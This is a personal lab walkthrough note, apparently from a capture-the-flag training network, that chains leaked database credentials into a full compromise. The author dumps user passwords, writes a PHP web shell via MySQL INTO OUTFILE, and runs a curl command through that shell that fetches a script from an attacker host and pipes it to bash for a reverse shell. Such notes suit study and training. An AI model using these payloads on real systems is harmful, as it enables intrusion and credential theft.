Now will try to login and see what data we can get from it 
```
mysql -u <username> -p -h 192.168.100.1
```

```
mysql -u admin -p -h 192.168.100.1
```

```
DBManagerLogin!
```

so this is not working which means we have to do osint in the file to get the pasword that might work

db_connect.php looks fishy
![[Pasted image 20240817172018.png]]


BINGOOOOOOOOOOOOOOO
```
define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');
```


```
mysql -u admin -p -h 192.168.100.1
```

```
!123SecureAdminDashboard321!
```


>[! important] Important

This happened here and might happened in the exam as well. I was not able to get the mysql shell in the dumb shell and after i changed it into interactive shell i was able to get it.

Taking help of Chat GPT

![[Pasted image 20240817224657.png]]

```
select username,password from users limit 10;
```

```
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA      
```


```
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```
![[Pasted image 20240817230257.png]]


We will try to get the shell from the Docker now
Attacker -> Linux Server  (RCE PHP injection)
Linux -> Docker (PHP injection via SQL) 
Docker -> Attacker (reverse shell)
```
curl 192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.51.9.13%3A80%2Fphp_rev.sh%7Cbash%20%26
```

![[Pasted image 20240818004729.png]]

```
www-data@ip-10-201-11-33:/var/www$ cat user.txt
cat user.txt
HOLO{3792d7d80c4dcabb8a533afddf06f666}
```

